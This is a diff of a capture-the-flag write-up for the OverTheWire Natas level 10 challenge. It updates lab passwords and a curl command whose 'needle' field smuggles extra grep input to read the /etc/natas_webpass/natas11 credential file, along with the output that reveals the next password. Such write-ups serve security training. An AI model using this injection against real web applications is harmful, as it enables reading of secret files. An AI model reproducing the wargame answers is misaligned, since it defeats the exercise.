@@ -9,7 +9,7 @@ weight: 11
 | info | value                                       |
 |:-----|--------------------------------------------:|
 | user | `natas10`                                   |
-| pass | `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`          |
+| pass | `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`          |
 | host | `http://natas10.natas.labs.overthewire.org` |
 
 ---
@@ -53,7 +53,7 @@ luckily this condition doesn't utilize [preg_quote](https://www.php.net/manual/e
 
 ```sh
 curl http://natas10.natas.labs.overthewire.org \
--u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu \
+-u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv \
 -d "needle=$ cat /etc/natas_webpass/natas11&submit=" | head -30
 ```
 
@@ -62,5 +62,5 @@ and es expected, some still work
 ```html
 Output:
 <pre>
-/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
 ```
